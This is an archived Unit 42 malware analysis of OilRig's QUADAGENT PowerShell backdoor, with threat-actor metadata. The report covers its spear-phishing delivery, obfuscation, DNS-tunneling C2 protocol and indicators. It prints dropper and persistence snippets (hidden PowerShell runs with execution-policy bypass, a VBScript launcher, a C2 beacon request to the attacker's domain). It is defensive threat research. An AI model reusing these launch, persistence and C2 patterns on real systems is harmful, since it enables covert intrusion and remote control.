{
    "id": "89f01545-1dd5-4171-b386-87d122fb2098",
    "created_at": "2023-01-12T15:09:40.694846Z",
    "updated_at": "2025-03-27T02:17:27.552725Z",
    "deleted_at": null,
    "sha1_hash": "3443d427defa718caf068fcdf2e1b66d694401d4",
    "title": "2018-07-25 - OilRig Targets Technology Service Provider and Government Agency with QUADAGENT",
    "authors": "",
    "file_creation_date": "2022-05-28T05:14:05Z",
    "file_modification_date": "2022-05-28T05:14:05Z",
    "file_size": 619403,
    "plain_text": "# OilRig Targets Technology Service Provider and Government Agency with QUADAGENT\n\n**[unit42.paloaltonetworks.com/unit42-oilrig-targets-technology-service-provider-government-agency-quadagent/](https://unit42.paloaltonetworks.com/unit42-oilrig-targets-technology-service-provider-government-agency-quadagent/)**\n\nBryan Lee, Robert Falcone July 25, 2018\n\nBy [Bryan Lee and](https://unit42.paloaltonetworks.com/author/bryanlee/) [Robert Falcone](https://unit42.paloaltonetworks.com/author/robertfalcone/)\n\nJuly 25, 2018 at 5:00 AM\n\n[Category: Unit 42](https://unit42.paloaltonetworks.com/category/unit42/)\n\nTags: [Invoke-Obfuscation,](https://unit42.paloaltonetworks.com/tag/invoke-obfuscation/) [OilRig,](https://unit42.paloaltonetworks.com/tag/oilrig/) [QUADAGENT,](https://unit42.paloaltonetworks.com/tag/quadagent/) [ThreeDollars](https://unit42.paloaltonetworks.com/tag/threedollars/)\n\nThis post is also available in: 日本語 [(Japanese)](https://unit42.paloaltonetworks.jp/unit42-oilrig-targets-technology-service-provider-government-agency-quadagent/)\n\nThe [OilRig group continues to adapt their tactics and bolster their toolset with newly developed tools. The OilRig group (AKA APT34,](https://researchenter.paloaltonetworks.com/tag/oilrig/)\nHelix Kitten) is an adversary motivated by espionage primarily operating in the Middle East region. We [first](https://blog.paloaltonetworks.com/2016/05/the-oilrig-campaign-attacks-on-saudi-arabian-organizations-deliver-helminth-backdoor/) [discovered this](https://blog.paloaltonetworks.com/2016/10/unit42-oilrig-malware-campaign-updates-toolset-and-expands-targets/) [group in](https://blog.paloaltonetworks.com/2017/11/unit42-oilrig-deploys-alma-communicator-dns-tunneling-trojan/)\nmid-2016, although it is possible their operations extends earlier than that time frame. They have shown themselves to be an extremely\npersistent adversary that shows no signs of slowing down. Examining their past behaviors with current events only seems to indicate\nthat the OilRig group’s operations are likely to accelerate even further in the near future.\n\nBetween May and June 2018, Unit 42 observed multiple attacks by the OilRig group appearing to originate from a government agency\nin the Middle East. Based on previously observed tactics, it is highly likely the OilRig group leveraged credential harvesting and\ncompromised accounts to use the government agency as a launching platform for their true attacks.\n\nThe targets in these attacks included a technology services provider as well as another government entity. Both these targets were in\nthe same nation-state. Further, the attacks against these targets were made to appear to have originated from other entities in the same\ncountry. However, the actual attackers themselves were outside this country and likely used stolen credentials from the intermediary\norganization to carry out their attacks.\n\nThe attacks delivered a PowerShell backdoor called QUADAGENT, a tool attributed to the OilRig group by both ClearSky Cyber\nSecurity and FireEye. In our own analysis, we were able to also confirm the attribution of this tool to the OilRig group by examining\nspecific artifacts that were reused from tools previously used by the OilRig group in addition to tactics reused from previous attacks as\nwell. The use of script-based backdoors is a common technique used by the OilRig group as we have previously documented.\nHowever, packaging these scripts into a portable executable (PE) file is not a tactic we have seen the OilRig group use frequently.\nDetailed analysis of QUADAGENT and its ties to Oilrig is the appendix at the end of this blog. QUADAGENT is the 12 custom builtth\ntool that Unit 42 has documented the OilRig group using for their attacks.\n\nOur analysis revealed the two QUADAGENT PE files we obtained were slightly different from each other. Primarily, one used a\nMicrosoft .NET Framework-based dropper that also opens a decoy dialog box, which can be seen in Figure 1. The other sample was a\nPE file generated via a bat2exe tool.\n\n**SHA256** **Filename** **PowerShell Filename** **Variant**\n\n\n5f001f3387ddfc0314446d0c950da2cec4c786e2374d42beb3acce6883bb4e63 <redacted>\nTechnical\nServices.exe\n\nd948d5b3702e140ef5b9247d26797b6dcdfe4fdb6f367bb217bc6b5fc79df520 tafahom.exe,\nSales\nModification.exe\n\n_Table 1. QUADAGENT PE Files_\n\n\nOffice365DCOMCheck.ps1 Bat2exe\n\nSystemDiskClean.ps1 .NET\n\n\nThe QUADAGENT backdoors dropped onto the hosts were nearly identical to each other, with the only differences being the command\nand control server (C2) and randomized obfuscation. We were also able to locate a third delivery package of the QUADAGENT\n[backdoor as reported by ClearSky Cyber Security. In their example, the OilRig group used a malicious macro document to deliver the](https://docs.google.com/document/d/1oYX3uN6KxIX_StzTH0s0yFNNoHDnV8VgmVqU5WoeErc/edit#heading=h.7rmo7cm81bl2)\nbackdoor, which is a tactic much more commonly used by them.\n\nA closer examination revealed the obfuscation used by the OilRig group in these QUADAGENT samples were likely the result of using\n[an open-source toolkit called Invoke-Obfuscation. This tool was originally intended to aid defenders in simulating obfuscated](https://github.com/danielbohannon/Invoke-Obfuscation)\nPowerShell commands to better their defenses. Invoke-Obfuscation has proven to be highly effective at obfuscating PowerShell scripts\nand in this case, the adversary was able to take advantage of the tool for increased chances of evasion and as an anti-analysis tactic.\n\n\n-----\n\nAttack Details\nThis latest attack consisted of three waves between May and June 2018. All three waves involved a single spear phishing email that\nappeared to originate from a government agency based in the Middle East. Based on our telemetry, we have high confidence the email\naccount used to launch this attack was compromised by the OilRig group, likely via credential theft.\nIn the two waves (May 30 and June 3) against the technology services provider, the victim email addresses were not easily\ndiscoverable via common search engines, indicating the targets were likely part of a previously collected target list, or possibly known\nassociates of the compromised account used to send the attack emails. The malicious attachment was a simple PE file (SHA256:\n5f001f3387ddfc0314446d0c950da2cec4c786e2374d42beb3acce6883bb4e63) with the filename <redacted> Technical Services.exe.\nThe file appears to have been compiled using a bat2exe tool, which will take batch files (.bat) and convert them to PE (.exe) files. Its\nsole purpose here is to install the QUADAGENT backdoor and execute it.\nOnce the victim downloads and executes the email attachment, it runs silently with no additional decoy documents or decoy dialog\nboxes. The executable will drop the packaged QUADAGENT PowerShell script using the filename Office365DCOMCheck.ps1 in\naddition to a VBScript file with the same filename which will assist in the execution of it. A scheduled task is also generated to maintain\npersistence of the payload. Once the QUADAGENT payload has executed, it will use rdppath[.]com as the C2, first via HTTPS, then\nHTTP, then via DNS tunneling, each being used as a corresponding fallback channel if the former fails.\nThe wave against the government entity (June 26) also involved a simple PE file attachment (SHA256:\nd948d5b3702e140ef5b9247d26797b6dcdfe4fdb6f367bb217bc6b5fc79df520) using the filename tafahom.exe. This PE was slightly\ndifferent from the other attack, being compiled using the Microsoft .NET Framework instead of being generated via a bat2exe tool and\ncontaining a decoy dialog box as shown in Figure 1.\n\n_Figure 1. Decoy dialog box_\n\nThe tactic of using a decoy dialog box is commonly used by multiple adversaries and is generally deployed as a method to reduce\nsuspicion by the victim. In comparison to being silently run, a victim may be less suspicious of a dialog/error message because they are\nprovided what appears to be a legitimate error response when attempting to open the attachment. When a file is silently run, because\nthere is no response to the user’s action, a victim may be more suspicious or curious on what actually happened.\n\nAfter the .NET PE file has been run, we observed the same behavior as the above QUADAGENT sample of dropping a PowerShell\nscript with the filename SystemDiskClean.ps1 alongside a VBScript file with the same name. The C2 techniques remained identical,\nwith the only change being the server which became cpuproc[.]com.\n\nUsing rdppath[.]com as a pivot point, we collected an additional QUADAGENT sample also communicating to this C2 (SHA256:\nd7130e42663e95d23c547d57e55099c239fa249ce3f6537b7f2a8033f3aa73de), which was first reported by ClearSky Cyber Security. In\ncontrast to the two samples used in these attacks, this one did not use a PE attachment, and instead used a Microsoft Word document\ncontaining a malicious macro as the delivery vehicle. The use of malicious macro delivery documents is a tactic we have observed the\n[OilRig group userepeatedly over the three years we’ve been tracking them. The actual QUADAGENT script payload used in the](https://blog.paloaltonetworks.com/2016/05/the-oilrig-campaign-attacks-on-saudi-arabian-organizations-deliver-helminth-backdoor/)\nClearSky sample was exactly the same as the one we found in the bat2exe version used against the aforementioned technical services\nprovider. The delivery document also used a filename that could be related to other technology services or media organizations within\nthat same nation state, although it is inconclusive. The document also contained a lure image, similar to ones commonly found in\nmalicious macro documents which ask the user to click on “Enable Content” as seen in Figure 2. Unlike many other delivery documents\nused by this group, there was no additional decoy content after the macro was enabled.\n\n\n-----\n\n_Figure 2. Lure image used to entice users to enable macros_\n\nUse of Open Source Tools\n\nIn an attempt to avoid detection and as an anti-analysis tactic, the OilRig group abused an open source tool called Invoke-Obfuscation\n[to obfuscate the code used for QUADAGENT. Invoke-Obfuscation is freely available via a Github repository and allows a user to](https://github.com/danielbohannon/Invoke-Obfuscation)\nchange the visual representation of a PowerShell script simply by selecting the desired obfuscation techniques. Invoke-Obfuscation\noffers a variety of obfuscation techniques, and by analyzing the script we were able to ascertain the specific options in this attack. After\nidentifying the specific options used to obfuscate QUADAGENT, we were able to deobfuscate the PowerShell script and perform\nadditional analysis.\n\nWe found two obfuscation techniques applied to the script: the first one changing the representation of variables; the second one\nchanging the representation of strings in the script.\n\nInvoke-Obfuscation calls the variable obfuscation technique used by the actors to obfuscate this script Random Case + {} + Ticks,\nwhich changes all variables in the script to have randomly cased characters, to be surrounded in curly braces and to include the tick (`)\ncharacter, which is ignored in by PowerShell. Invoke-Obfuscation calls the string obfuscation used by the actors to further obfuscate this\nscript Reorder, which uses the string formatting functionality within PowerShell to reconstruct strings from out of order substrings (ex. \"\n{1}{0}\" -f 'bar','foo').\n\nDuring our analysis, we installed Invoke-Obfuscation and used it to obfuscate a previously collected QUADAGENT sample to confirm\nour analysis. We used the two previously mentioned obfuscation options within Invoke-Obfuscation on this QUADAGENT sample,\nwhich resulted in the generation of a very similar script as the Office365DCOMCheck.ps1 and SystemDiskClean.ps1 payloads\ndelivered in the attacks discussed in this blog. We captured the commands we ran in Invoke-Obfuscation in the animation in Figure 3\nbelow, which visualizes the steps the threat actor may have taken to create the payload delivered in this attack.\n\n\n-----\n\n_Figure 3. Possible steps carried out in Invoke-Obfuscation on the QUADAGENT sample_\n\nConclusion\nThe OilRig group continues to be a persistent adversary group in the Middle East region. While their delivery techniques are fairly\nsimple, the various tools we have attributed as part of their arsenal reveal sophistication. In this instance, they illustrated a typical\nbehavior of adversary groups, wherein the same tool was reused in multiple attacks, but each had enough modifications via\ninfrastructure change, additional obfuscation, and repackaging that each sample may appear different enough to bypass security\ncontrols. A key component to always remember is that for these type of adversary groups, they will follow the path of least resistance in\ntheir attacks, as long as their mission directive is accomplished.\nPalo Alto Networks customers may learn more and are protected via the following ways:\n\nWildFire classifies QUADAGENT samples as malicious\nQUADAGENT C2 Domains have been classified as malicious\n[AutoFocus customers can track QUADAGENT via its corresponding tag](https://autofocus.paloaltonetworks.com/#/tag/Unit42.QUADAGENT)\n\nIOCs\n**SHA256 Hashes**\nQUADAGENT\nd948d5b3702e140ef5b9247d26797b6dcdfe4fdb6f367bb217bc6b5fc79df520\nd7130e42663e95d23c547d57e55099c239fa249ce3f6537b7f2a8033f3aa73de\n5f001f3387ddfc0314446d0c950da2cec4c786e2374d42beb3acce6883bb4e63\n\nThreeDollars\n1f6369b42a76d02f32558912b57ede4f5ff0a90b18d3b96a4fe24120fa2c300c\n119c64a8b35bd626b3ea5f630d533b2e0e7852a4c59694125ff08f9965b5f9cc\n\n**Domains**\nrdppath[.]com\ncpuproc[.]com\nacrobatverify[.]com\n\n\n-----\n\n**Filenames**\nOffice365DCOMCheck.ps1\nOffice365DCOMCheck.vbs\nSystemDiskClean.ps1\nSystemDiskClean.vbs\nAdobeAcrobatLicenseVerify.ps1\nc:\\Users\\<username>\\AppData\\Roaming\\Out.jpg\n\n**Appendix**\n\nQUADAGENT Relationship to Other OilRig Tools\nDuring our regular data gathering functions several months ago, we collected a delivery document (SHA256:\n1f6369b42a76d02f32558912b57ede4f5ff0a90b18d3b96a4fe24120fa2c300c) that contained an at-the-time an unknown payload which\nwould be revealed to be QUADAGENT. While we do not have data supporting targeting information or telemetry, we know the\ndocument was created in January 2018 and likely used in an attack around that time frame. In addition, the delivery document shared\nmetadata artifacts with the ThreeDollars delivery document (SHA256:\n119c64a8b35bd626b3ea5f630d533b2e0e7852a4c59694125ff08f9965b5f9cc) that OilRig used to deliver the ISMAgent payload in a\n[targeted attack In January 2018 on a government entity in the Middle East.](https://blog.paloaltonetworks.com/2018/02/unit42-oopsie-oilrig-uses-threedollars-deliver-new-trojan/)\nThe QUADAGENT payload dropped by the delivery document had the filename AdobeAcrobatLicenseVerify.ps1 and used\nacrobatverify[.]com\nfor its C2. Examining the subdomains for acrobatverify[.]com reveals three subdomains, www, resolve, and dns. The passive DNS data\nfor the subdomains shows an IP resolution of 185.162.235[.]121 from December 2017 through January 2018. Prior to this time period,\nwe see several subdomains of msoffice-cdn[.]com, ns1, ns2, and www also resolving to this IP. This IP and msoffice-cdn[.]com were\nboth [previously referenced in our first report on an OilRig attack using the ThreeDollars delivery document.](https://blog.paloaltonetworks.com/2017/10/unit42-oilrig-group-steps-attacks-new-delivery-documents-new-injector-trojan/)\nWe used this QUADAGENT payload when testing the Invoke-Obfuscation tool mentioned in this blog. By applying two specific\nobfuscation techniques within Invoke-Obfuscation, we were able to create an obfuscated PowerShell script that was very similar to the\nQUADAGENT payloads delivered in the attacks discussed in this blog.\n\nQUADAGENT Analysis\nThe final payload delivered in all three attack waves is a PowerShell downloader referred to by other research organizations as\nQUADAGENT. The downloaders in these attacks were configured to use both rdppath[.]com and cpuproc[.]com as their C2 servers.\nWhen communicating with its C2 server, the downloaders use multiple protocols, specifically HTTPS, HTTP or DNS, each of which\nprovide a fallback channel in that order. For instance, the downloader will first attempt to communicate with its C2 server using an\nHTTPS request. If that HTTPS request is not successful, the downloader will issue an HTTP request. Lastly, if the HTTP request is not\nsuccessful, the downloader will fallback to using DNS tunneling to establish communications. We provide more on the specific usage of\nthese protocols as we discuss the inner workings of this malware in this section.\nThe downloader will use the filename of the script (ex. Office365DCOMCheck or SystemDiskClean) as the name for the scheduled task\nto maintain persistence on the victim host. To create the scheduled task, the PowerShell payload starts by writing the following to a\nVBScript file with the same name as the task name (ex. Office365DCOMCheck.vbs or SystemDiskClean.vbs) within the %TEMP%\nfolder:\n\n1 CreateObject(\"WScript.Shell\").Run \"\" & WScript.Arguments(0) & \"\", 0, False\n\nThe scheduled task will then run every five minutes, which provides persistent execution of the downloader script. The task itself is fairly\nsimple, calling the VBScript file which contains a PowerShell one-liner as an argument to run the QUADAGENT payload (ex.\nOffice365DCOMCheck.ps1 and SystemDiskClean.ps1):\n\n1 wscript.exe \"Office365DCOMCheck.vbs\" \\\"PowerShell.exe -ExecutionPolicy bypass -WindowStyle hidden -NoProfile '<current\nPowerShell script>' \\\"\n\nAfter setting up persistent access, the payload checks to see if a value exists within a registry key in the HKCU hive whose name is the\nsame as the scheduled task (ex. Office365DCOMCheck or SystemDiskClean), such as the following:\n\nHKCU\\Office365DCOMCheck\n\n\n-----\n\nThe payload uses this registry key to store a session identifier unique to the compromised system, as well as a pre shared key used for\nencrypting and decrypting communications between the system and the C2 server. This registry key is empty upon the first execution of\nthe payload. The payload will communicate with its C2 server to obtain the session ID and pre-shared key and write it to this registry\nkey in the following format:\n\n<session id>_<pre-shared key>\n\nTo obtain the session ID and pre-shared key, the payload will first try to contact the C2 via an HTTPS GET request to the following URL:\n\nhxxps://www.rdppath[.]com/\n\nIf the above request using HTTPS does not result in an HTTP 200 OK message or the response data has no alphanumeric characters,\nthe code will attempt to communicate with the C2 server using HTTP via the following URL:\n\nhxxp://www.rdppath[.]com/\n\nThe code to communicate with the C2 via HTTP exists within an exception handler. To trigger this, if the HTTPS requests do not work,\nthe payload attempts to cause an exception by dividing 1 by 0. This exception invokes the exception handler containing the HTTP\ncommunication code, allowing it to run.\nIf either attempt is successful, the C2 server will respond with the session ID and a pre-shared key in cleartext, which it will save to the\npreviously mentioned registry key. The C2 server will provide the pre-shared key within the response data and will provide the session\nID value via the Set-Cookie field within the response, specifically the string after the PHPSESSID parameter of the cookie.\nIf both attempts fail and the payload is unable to obtain a session ID and pre-shared key via HTTP or HTTPS, it will try to use DNS\ntunneling. To obtain the session ID and pre-shared key, the payload will issue a query to resolve the following domain:\n\nmail.<random number between 100000 and 999999>.<c2 name>\n\nThis request notifies the C2 server that the payload is about to send system specific data as part of the initial handshake. The script\ngathers system specific data, such as the domain the system belongs to and the current username, that it constructs in the following\nformat:\n\n<domain>\\<username>:pass\n\nThe above string is encoded using a custom base64 encoder to strip out non-alphanumeric characters (=, / and +) from the data and\nreplaces them with domain safe values (01, 02 and 03 respectively).\n<encoded system data>.<same random number between 100000 and 999999 above>.<c2 name>\n\nAfter obtaining a session ID and pre-shared key, the PowerShell script will continue to communicate with its C2 server to obtain data to\ntreat as a command. The script will first attempt to communicate with the C2 server using HTTPS (HTTP if unsuccessful), which\ninvolves GET requests using the session ID within the request's cookie in the PHPSESSID field, as seen in the example GET request:\n\n\n1\n2\n3\n4\n5\n\n\nGET / HTTP/1.1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135\nSafari/537.36 Edge/12.246\nHost: www.rdppath[.]com\nCookie: PHPSESSID=<c2 provided session id>\nConnection: Keep-Alive\n\n\n-----\n\nIf the payload is unable to reach the C2 via HTTPS/HTTP, the payload yet again falls back to DNS tunneling. The payload will issue a\nDNS query to the following domain to notify the C2 that it is about to send it data (session ID value) to it in a subsequent query:\n\nns1.<random number between 100000 and 999999>.<c2 name>\nThe payload does nothing with the C2 server’s response to the query. Instead, it immediately issues a query to resolve the following\ndomain, which embeds the session ID value to transmit it to the C2:\n\n<encoded session id>.<same random number between 100000 and 999999>.<c2 domain name>\n\nTo transmit the data via the DNS tunneling, the C2 server will respond to the above query with an IPv6 address that contains the\nnumber of DNS queries the payload must issue to obtain the entirety of the data from subsequent IPv6 answers. The script will send\nthe specified number of DNS queries using the following format, each of which the C2 will respond with an IPv6 address that the script\nwill treat as a string of data:\n\nwww.<sequence number>.<same random number between 100000 and 999999>.<c2 domain name>\n\nThe payload will treat the data provided by the C2 as a message, which will have the following structure:\n\nhello<char uuid[35]><char type[1]><data>\n\nThe message will start with the string hello followed by a 35-character UUID string. The type field specifies the command that the\npayload will handle. This specific variant of the payload can only handle one command type, x. The data field within the message is a\nstring of custom base64 encoded data that the malware decodes using the same custom base64 routine mentioned earlier and\ndecrypts it using AES and the pre-shared key. The x command treats the supplied data as a PowerShell script that it will write to the\ncurrent PowerShell script (Office365DCOMCheck.ps1/SystemDiskClean.ps1), effectively overwriting the initial PowerShell script with a\nsecondary payload script. Also, the x command will delete the generated registry key and the Office365DCOMCheck/SystemDiskClean\nscheduled task. It will run the newly downloaded PowerShell script by running the following command via cmd /c:\n\n1 wscript.exe \"Office365DCOMCheck.vbs\" \"PowerShell.exe-ExecutionPolicy bypass -WindowStyle hidden -NoProfile <path to\nOffice365DCOMCheck.ps1 script>\"\n\nThe payload will then notify the C2 it has successfully downloaded and executed the secondary PowerShell payload. It does so using\neither the HTTPS/HTTP or DNS channels, depending on which method is successful. The payload will construct a message that has\nthe following structure that it will then send to the C2:\n\nbye<char uuid[35]>d\n\nThe message above is sent via a simple HTTPS/HTTP POST request to the C2 server. If that fails, the payload will use DNS tunneling\nby first issuing a DNS query to resolve the following domain to notify the C2 that the payload will send data to it in subsequent DNS\nqueries:\n\nns1.<random number between 100000 and 999999>.<c2 name>\n\nThe payload will then split the message up into 60-byte chunks (only 1 in this case), which it will send to the C2 via DNS queries to\nresolve domains structured as:\n\n\n-----\n\nencoded/encrypted data of message . same random number between 100000 and 999999 . c2 name\n\nThe payload will notify the C2 that it is done sending data by issuing a DNS query to resolve a domain structured as:\n\nns2.<same random number between 100000 and 999999>.<c2 name>\n\nPackage Comparison of the QUADAGENT Samples\nThe bat2exe version (SHA256: 5f001f3387ddfc0314446d0c950da2cec4c786e2374d42beb3acce6883bb4e63)has a batch script,\nPowerShell script, and associated file names embedded within several resources that it will decrypt using RC4 and various MD5\nhashes for keys. The executable obtains an embedded PowerShell script, decrypts it using RC4, then decompresses it using ZLIB, and\nsaves the cleartext to C:\\Users\\<username>\\AppData\\Roaming\\Out.jpg. The batch script will then rename Out.jpg to\nOffice365DCOMCheck.ps1 and execute it with the following command:\n\n\n1\n2\n3\n\n\n@shift /0\nrename Out.jpg Office365DCOMCheck.ps1\nPowerShell -exec bypass -File .\\Office365DCOMCheck.ps1\n\n\nThe .NET variant (SHA256: d948d5b3702e140ef5b9247d26797b6dcdfe4fdb6f367bb217bc6b5fc79df520) is even simpler. This dropper\nstarts by displaying the dialog box in Figure 1, previously shown and discussed with the following command:\n\n1 Interaction.MsgBox(\"An error occurred while processing your request. code(2343)\", MsgBoxStyle.Critical, null);\n\nThe dropper then writes the content of the payload which resides as plaintext in a resource within the .NET assembly to C:\\Users\\\n<username>\\AppData\\Local\\Temp\\SystemDiskClean.ps1. It will then execute it as a shell object:\n\n1 cmd.exe /c powershell -exec bypass -file \"C:\\Users\\Administrator\\AppData\\Local\\Temp\\SystemDiskClean.ps1\"\n\nIn the malicious macro attack, the same Office365DCOMCheck.ps1 script that was used in the PE version is used as the payload.\nWhen the document is opened, a lure image as shown as seen in Figure 2 is displayed in an attempt to coerce the victim to enable\nmacros.\nWhen macros are enabled and run, the macro within the Word document searches the sections of the document to get the contents of\nthe header using the following piece of code:\n\n1 Set rng = ActiveDocument.Sections(intSection).Headers(1).Range\n\nThe code above obtains the contents of the header, which the macro will write to a file at C:\\programdata\\Office365DCOMCheck.ps1.\nThe creator of the delivery document was able to visually hide the PowerShell script in the header by setting the text to a font size of 2\nand font color of white, as seen in Figure 4.\n\n\n-----\n\n_Figure 4. Hidden PowerShell script within the document s header using a small white font_\n\nThis technique of hiding malicious content by using a small white font is not unique to this threat group, as we recently observed the\n[Sofacy group use this technique to hide DDE instructions within one of their delivery documents.](https://blog.paloaltonetworks.com/2018/06/unit42-sofacy-groups-parallel-attacks/)\n\n**Get updates from**\n**Palo Alto**\n**Networks!**\n\nSign up to receive the latest news, cyber threat intelligence and research from us\n\n[By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement.](https://www.paloaltonetworks.com/legal-notices/terms-of-use)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2018/2018-07-25 - OilRig Targets Technology Service Provider and Government Agency with QUADAGENT.pdf"
    ],
    "report_names": [
        "2018-07-25 - OilRig Targets Technology Service Provider and Government Agency with QUADAGENT.pdf"
    ],
    "threat_actors": [
        {
            "id": "ce10c1bd-4467-45f9-af83-28fc88e35ca4",
            "created_at": "2022-10-25T15:50:23.458833Z",
            "updated_at": "2025-03-27T02:00:55.475188Z",
            "deleted_at": null,
            "main_name": "APT34",
            "aliases": null,
            "source_name": "MITRE:APT34",
            "tools": [
                "netstat",
                "Systeminfo",
                "PsExec",
                "SEASHARPEE",
                "Tasklist",
                "Mimikatz",
                "POWRUNER",
                "certutil"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "f8dddd06-da24-4184-9e24-4c22bdd1cbbf",
            "created_at": "2023-01-06T13:46:38.626906Z",
            "updated_at": "2025-03-27T02:00:02.877001Z",
            "deleted_at": null,
            "main_name": "Tick",
            "aliases": [
                "Stalker Taurus",
                "PLA Unit 61419",
                "Nian",
                "BRONZE BUTLER",
                "REDBALDKNIGHT",
                "STALKER PANDA",
                "G0060"
            ],
            "source_name": "MISPGALAXY:Tick",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "cffb3c01-038f-4527-9cfd-57ad5a035c22",
            "created_at": "2022-10-25T15:50:23.38055Z",
            "updated_at": "2025-03-27T02:00:55.459558Z",
            "deleted_at": null,
            "main_name": "OilRig",
            "aliases": [
                "COBALT GYPSY",
                "IRN2",
                "APT34",
                "Helix Kitten",
                "Evasive Serpens",
                "Hazel Sandstorm",
                "EUROPIUM",
                "ITG13"
            ],
            "source_name": "MITRE:OilRig",
            "tools": [
                "ISMInjector",
                "RDAT",
                "Systeminfo",
                "QUADAGENT",
                "OopsIE",
                "Tasklist",
                "certutil",
                "ZeroCleare",
                "POWRUNER",
                "netstat",
                "ipconfig",
                "LaZagne",
                "BONDUPDATER",
                "SideTwist",
                "PsExec",
                "SEASHARPEE",
                "Mimikatz",
                "RGDoor",
                "ftp"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "67709937-2186-4a32-b64c-a5693d40ac77",
            "created_at": "2023-01-06T13:46:38.495593Z",
            "updated_at": "2025-03-27T02:00:02.848206Z",
            "deleted_at": null,
            "main_name": "OilRig",
            "aliases": [
                "IRN2",
                "Hazel Sandstorm",
                "EUROPIUM",
                "TA452",
                "Earth Simnavaz",
                "Cobalt Gypsy",
                "Crambus",
                "Helix Kitten",
                "APT 34",
                "APT34",
                "ATK40",
                "G0049",
                "Evasive Serpens",
                "Twisted Kitten"
            ],
            "source_name": "MISPGALAXY:OilRig",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "3eebdb3f-f4e3-42e5-bb4d-f02a13328316",
            "created_at": "2024-05-01T02:03:08.014303Z",
            "updated_at": "2025-03-27T02:05:17.306592Z",
            "deleted_at": null,
            "main_name": "COBALT EDGEWATER",
            "aliases": [
                "Cold River ",
                "DNSpionage ",
                "APT34 "
            ],
            "source_name": "Secureworks:COBALT EDGEWATER",
            "tools": [
                " DNSpionage",
                " Karkoff",
                " MailDropper",
                " SideTwist",
                " TWOTONE",
                "AgentDrable"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "e3767160-695d-4360-8b2e-d5274db3f7cd",
            "created_at": "2022-10-25T16:47:55.914348Z",
            "updated_at": "2025-03-27T02:05:17.411172Z",
            "deleted_at": null,
            "main_name": "IRON TWILIGHT",
            "aliases": [
                "ATK5 ",
                "Blue Athena ",
                "BlueDelta ",
                "FROZENLAKE ",
                "Fancy Bear ",
                "Fighting Ursa ",
                "Forest Blizzard ",
                "GRAPHITE ",
                "Group 74 ",
                "PawnStorm ",
                "STRONTIUM ",
                "Sednit ",
                "Snakemackerel ",
                "Sofacy ",
                "TG-4127 ",
                "Tsar Team ",
                "APT28 "
            ],
            "source_name": "Secureworks:IRON TWILIGHT",
            "tools": [
                " Downdelph",
                " Drovorub",
                " EVILTOSS",
                " HIDEDRV",
                " Headlace",
                " LoJack",
                " Powershell Empire",
                " SCONATO",
                " SEDUPLOADER",
                " SHARPFRONT",
                " Scaramouche",
                " Sedkit Exploit Kit",
                " Sofacy downloader",
                " X-Agent",
                " X-Tunnel",
                " Zebrocy",
                " reGeorg",
                "DEALERSCHOICE"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "8f9c8a6e-f6b6-431b-bedd-94fdeea5474a",
            "created_at": "2024-05-01T02:03:08.022974Z",
            "updated_at": "2025-03-27T02:05:17.310877Z",
            "deleted_at": null,
            "main_name": "COBALT GYPSY",
            "aliases": [
                "CHRYSENE ",
                "Crambus ",
                "EUROPIUM ",
                "Hazel Sandstorm ",
                "Helix Kitten ",
                "ITG13 ",
                "OilRig ",
                "Yellow Maero ",
                "APT34 "
            ],
            "source_name": "Secureworks:COBALT GYPSY",
            "tools": [
                " Helminth",
                " Jason",
                " MacDownloader",
                " PoisonFrog",
                " RGDoor",
                " ThreeDollars",
                " TinyZbot",
                " Toxocara",
                " Trichuris",
                " TwoFace",
                "Glimpse"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "730dfa6e-572d-473c-9267-ea1597d1a42b",
            "created_at": "2023-01-06T13:46:38.389985Z",
            "updated_at": "2025-03-27T02:00:02.821388Z",
            "deleted_at": null,
            "main_name": "APT28",
            "aliases": [
                "FROZENLAKE",
                "BlueDelta",
                "SNAKEMACKEREL",
                "TG-4127",
                "ITG05",
                "TA422",
                "Fancy Bear",
                "FANCY BEAR",
                "Sednit",
                "IRON TWILIGHT",
                "G0007",
                "Sofacy",
                "Forest Blizzard",
                "GruesomeLarch",
                "Pawn Storm",
                "Tsar Team",
                "STRONTIUM",
                "ATK5",
                "Blue Athena",
                "APT-C-20",
                "Group 74",
                "SIG40",
                "Grizzly Steppe",
                "Fighting Ursa",
                "T-APT-12",
                "UAC-0028"
            ],
            "source_name": "MISPGALAXY:APT28",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "ae320ed7-9a63-42ed-944b-44ada7313495",
            "created_at": "2022-10-25T15:50:23.671663Z",
            "updated_at": "2025-03-27T02:00:55.518748Z",
            "deleted_at": null,
            "main_name": "APT28",
            "aliases": [
                "APT28",
                "IRON TWILIGHT",
                "SNAKEMACKEREL",
                "Group 74",
                "Sednit",
                "Sofacy",
                "Pawn Storm",
                "Fancy Bear",
                "STRONTIUM",
                "Tsar Team",
                "Threat Group-4127",
                "TG-4127",
                "Forest Blizzard",
                "FROZENLAKE"
            ],
            "source_name": "MITRE:APT28",
            "tools": [
                "Wevtutil",
                "certutil",
                "Forfiles",
                "DealersChoice",
